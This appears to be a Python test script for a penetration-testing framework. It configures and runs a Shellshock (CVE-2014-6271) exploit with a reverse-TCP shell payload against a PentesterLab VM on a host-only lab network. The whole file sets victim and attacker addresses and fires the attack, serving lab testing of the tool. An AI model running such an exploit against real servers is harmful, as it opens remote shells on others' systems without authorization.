"""
This tests the shellshock exploit on a vulnerable server (VM running on host)

VM is the CVE-2014-6271 .iso from pentesterlabs:
	https://pentesterlab.com/exercises/cve-2014-6271/iso

Running on host-only network through virtualbox
"""
from core.core import Core

victim_ip = "192.168.56.101"
victim_port = "80"
attacker_ip = "192.168.56.1"
attacker_port = "4444"
payload = "reverse_tcp"
cgi_path = "cgi-bin/status"

test_core = Core()
test_core.new_session()
test_core.load_exploit("shellshock")
test_core.active_session.set_exploit_field(["victim_ip", victim_ip])
test_core.active_session.set_exploit_field(["victim_port", victim_port])
test_core.active_session.set_exploit_field(["attacker_ip", attacker_ip])
test_core.active_session.set_exploit_field(["attacker_port", attacker_port])
test_core.active_session.set_exploit_field(["cgi_path", cgi_path])
test_core.active_session.set_exploit_field(["payload", payload])
test_core.active_session.run_exploit()